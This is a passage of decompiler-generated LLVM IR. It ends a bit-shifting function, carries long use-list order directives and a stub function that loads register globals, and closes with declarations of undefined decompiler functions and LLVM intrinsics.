  %v3_184dc = mul i32 %arg2, 2048
  %v4_184e4 = udiv i32 %arg1, 2097152
  %v1_184e0 = or i32 %v4_184e4, %v3_184dc
  %v5_184e4 = or i32 %v1_184e0, -2147483648
  %v6_184e8 = lshr i32 %v5_184e4, %v5_184d4
  ret i32 %v6_184e8

dec_label_pc_184f0:                               ; preds = %dec_label_pc_184cc, %dec_label_pc_184bc
  ret i32 0

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184c4
  %v4_184f8 = mul i32 %arg2, 4096
  %v5_184f8 = or i32 %v4_184f8, %arg1
  %v7_184f8 = icmp eq i32 %v5_184f8, 0
  br i1 %v7_184f8, label %dec_label_pc_18500, label %dec_label_pc_18508

dec_label_pc_18500:                               ; preds = %dec_label_pc_184f8, %dec_label_pc_184d0
  ret i32 -1

dec_label_pc_18508:                               ; preds = %dec_label_pc_184f8
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 34, 236, 160, 161, 37, 38, 35, 36, 162, 39, 159, 163, 164, 165, 1, 166, 167, 2, 3, 74, 168, 75, 256, 143, 258, 76, 259, 133, 276, 260, 77, 316, 261, 4, 78, 262, 79, 263, 264, 169, 170, 130, 171, 139, 80, 5, 172, 267, 64, 65, 268, 173, 134, 174, 136, 175, 6, 176, 138, 137, 269, 270, 53, 54, 55, 56, 58, 66, 7, 8, 62, 237, 9, 10, 11, 82, 86, 81, 83, 128, 129, 87, 85, 84, 144, 238, 88, 317, 89, 277, 177, 278, 279, 240, 241, 242, 90, 243, 91, 244, 92, 247, 12, 13, 178, 271, 272, 179, 40, 41, 42, 43, 280, 180, 72, 44, 181, 281, 45, 14, 46, 182, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 183, 318, 319, 184, 93, 282, 185, 186, 283, 284, 73, 67, 68, 285, 286, 287, 288, 289, 140, 94, 290, 141, 15, 158, 69, 70, 187, 291, 292, 293, 188, 145, 294, 295, 189, 16, 190, 296, 297, 146, 257, 191, 18, 17, 192, 193, 19, 246, 194, 95, 348, 96, 349, 97, 253, 98, 321, 99, 245, 100, 350, 63, 322, 101, 239, 102, 249, 103, 351, 104, 105, 250, 106, 251, 107, 323, 324, 20, 195, 196, 197, 198, 325, 265, 266, 147, 108, 248, 61, 199, 21, 150, 149, 148, 200, 22, 201, 151, 326, 26, 202, 203, 25, 27, 327, 24, 204, 205, 47, 23, 206, 48, 49, 109, 298, 110, 111, 254, 112, 299, 113, 300, 114, 273, 115, 301, 116, 302, 60, 117, 303, 157, 207, 208, 209, 210, 211, 212, 213, 118, 156, 304, 119, 274, 214, 275, 215, 28, 216, 131, 120, 329, 217, 305, 218, 306, 307, 50, 308, 309, 71, 310, 219, 220, 132, 142, 135, 311, 29, 221, 152, 312, 222, 30, 51, 57, 59, 155, 52, 252, 313, 330, 331, 153, 121, 332, 122, 328, 123, 320, 124, 255, 125, 352, 126, 314, 127, 315, 223, 224, 225, 226, 154, 227, 228, 229, 230, 231, 232, 233, 31, 32, 33, 234, 235 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 22, 24, 13, 11, 14, 27, 15, 12, 25, 16, 26, 17, 23, 18, 19 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 206, 36, 37, 179, 180, 181, 183, 184, 185, 90, 186, 38, 120, 187, 188, 189, 39, 121, 190, 191, 192, 117, 122, 195, 162, 165, 92, 123, 196, 124, 172, 40, 173, 197, 198, 199, 41, 207, 208, 209, 166, 193, 42, 43, 44, 194, 182, 200, 201, 202, 203, 45, 46, 93, 94, 95, 96, 229, 230, 109, 231, 232, 97, 233, 234, 221, 210, 89, 211, 212, 47, 48, 213, 214, 125, 126, 235, 49, 174, 50, 98, 51, 52, 107, 175, 53, 236, 108, 222, 54, 55, 223, 56, 57, 88, 58, 59, 60, 61, 110, 224, 225, 62, 63, 0, 167, 226, 64, 227, 204, 178, 1, 99, 168, 65, 66, 100, 101, 112, 102, 113, 103, 104, 105, 106, 91, 169, 170, 215, 216, 118, 67, 68, 69, 70, 71, 119, 217, 114, 111, 72, 218, 219, 220, 228, 171, 73, 74, 164, 75, 76, 77, 78, 79, 80, 163, 81, 82, 83, 84, 85, 176, 86, 127, 128, 129, 177, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 115, 154, 116, 155, 156, 157, 158, 205, 87, 159, 160, 161 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_18510() local_unnamed_addr {
entry:
  %v3_18514 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_18514)
  %v31_1851c = load i32, i32* @r0, align 4
  ret i32 %v31_1851c

; uselistorder directives
  uselistorder i32* @r0, { 64, 253, 252, 34, 55, 254, 67, 255, 5, 68, 256, 257, 66, 69, 258, 47, 56, 259, 260, 261, 262, 96, 97, 70, 263, 264, 265, 266, 267, 268, 269, 23, 270, 271, 57, 272, 273, 274, 275, 276, 63, 6, 184, 187, 74, 185, 186, 2, 200, 199, 58, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 217, 218, 219, 223, 224, 225, 226, 227, 228, 229, 230, 77, 231, 232, 98, 99, 100, 101, 102, 233, 234, 235, 237, 236, 16, 328, 277, 278, 103, 104, 142, 220, 75, 221, 222, 76, 51, 198, 238, 239, 240, 241, 242, 38, 17, 18, 53, 354, 19, 44, 20, 21, 189, 3, 190, 116, 117, 118, 7, 329, 50, 279, 281, 282, 80, 283, 81, 82, 284, 285, 286, 83, 287, 288, 289, 290, 291, 292, 293, 294, 49, 295, 296, 297, 298, 41, 48, 188, 191, 192, 193, 194, 195, 196, 197, 26, 43, 105, 106, 107, 39, 37, 40, 35, 143, 144, 145, 355, 357, 358, 88, 89, 90, 91, 92, 93, 94, 95, 27, 29, 108, 109, 356, 215, 216, 60, 161, 162, 163, 164, 165, 110, 111, 331, 54, 86, 87, 332, 8, 333, 334, 335, 330, 336, 337, 338, 339, 340, 28, 243, 31, 9, 52, 62, 299, 300, 301, 302, 61, 59, 349, 84, 303, 42, 244, 245, 342, 112, 10, 24, 304, 305, 306, 11, 12, 307, 308, 13, 15, 0, 1, 309, 310, 14, 311, 312, 313, 33, 85, 314, 315, 316, 317, 318, 32, 319, 22, 320, 321, 4, 322, 323, 113, 341, 114, 115, 343, 344, 345, 346, 146, 147, 148, 149, 150, 324, 325, 46, 45, 30, 280, 36, 353, 119, 120, 121, 122, 123, 71, 72, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 151, 152, 153, 154, 155, 156, 157, 158, 78, 79, 159, 25, 160, 73, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 246, 247, 248, 249, 250, 347, 348, 350, 352, 351, 251, 326, 327, 65 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 39, 40, 41, 45, 46, 36, 37, 38, 33, 34, 35, 92, 30, 31, 32, 47, 1, 2, 3, 4, 5, 6, 97, 98, 99, 100, 93, 50, 94, 95, 96, 7, 27, 28, 29, 8, 9, 10, 11, 12, 13, 88, 89, 90, 101, 102, 103, 51, 52, 53, 54, 55, 56, 104, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 42, 43, 44, 72, 73, 15, 16, 48, 49, 74, 75, 76, 77, 78, 79, 17, 18, 19, 20, 21, 22, 23, 24, 25, 80, 81, 82, 83, 84, 85, 86, 87, 14, 26, 91 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 51, 393, 13, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 52, 53, 54, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 200, 15, 201, 14, 202, 203, 204, 205, 209, 16, 5, 234, 235, 245, 246, 247, 248, 249, 250, 251, 252, 253, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 6, 280, 288, 289, 290, 291, 292, 293, 294, 295, 17, 296, 297, 319, 316, 317, 320, 321, 322, 318, 323, 324, 325, 326, 327, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 7, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 18, 20, 68, 19, 69, 70, 71, 72, 73, 346, 347, 348, 349, 352, 3, 350, 351, 10, 42, 357, 358, 353, 354, 355, 356, 11, 425, 534, 21, 535, 536, 537, 22, 538, 539, 540, 541, 542, 543, 544, 426, 427, 545, 546, 428, 429, 430, 77, 78, 79, 254, 255, 144, 145, 298, 299, 300, 301, 302, 303, 304, 305, 306, 23, 307, 308, 309, 310, 311, 312, 313, 314, 315, 236, 237, 238, 239, 240, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 547, 548, 654, 655, 210, 211, 24, 8, 212, 124, 125, 126, 127, 128, 129, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 549, 550, 551, 552, 553, 554, 25, 555, 556, 213, 214, 215, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 26, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 27, 452, 453, 454, 28, 455, 29, 456, 457, 458, 459, 460, 9, 461, 0, 462, 463, 557, 464, 1, 241, 242, 243, 244, 206, 207, 208, 216, 217, 218, 30, 219, 220, 221, 31, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 80, 81, 82, 83, 74, 75, 76, 84, 85, 86, 12, 87, 88, 89, 90, 91, 92, 558, 559, 672, 673, 674, 560, 561, 677, 682, 683, 684, 685, 686, 687, 688, 675, 93, 94, 95, 173, 174, 175, 676, 281, 32, 282, 283, 284, 285, 286, 287, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 176, 177, 178, 179, 33, 2, 180, 181, 182, 183, 184, 645, 646, 110, 111, 112, 185, 186, 187, 188, 189, 190, 106, 107, 108, 109, 113, 114, 647, 648, 649, 650, 651, 652, 678, 681, 115, 116, 117, 118, 562, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 34, 579, 580, 581, 582, 563, 564, 565, 566, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 45, 596, 597, 4, 598, 599, 600, 601, 602, 603, 679, 680, 193, 194, 377, 378, 379, 380, 604, 605, 606, 607, 608, 609, 610, 611, 612, 328, 329, 330, 465, 466, 467, 468, 35, 469, 470, 471, 472, 473, 474, 46, 475, 476, 477, 478, 479, 381, 382, 383, 384, 36, 385, 386, 387, 37, 613, 614, 615, 618, 619, 620, 388, 389, 390, 621, 622, 623, 146, 147, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 38, 524, 525, 526, 527, 528, 119, 120, 121, 509, 510, 47, 43, 511, 616, 617, 122, 123, 624, 625, 626, 39, 627, 40, 628, 41, 629, 630, 631, 632, 633, 634, 635, 148, 48, 149, 44, 150, 151, 152, 153, 154, 155, 156, 157, 529, 530, 531, 532, 636, 637, 638, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 158, 159, 160, 161, 162, 167, 168, 169, 170, 171, 172, 191, 192, 195, 196, 197, 198, 199, 391, 392, 533, 639, 640, 641, 642, 643, 644, 163, 164, 165, 166, 49, 50, 653 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
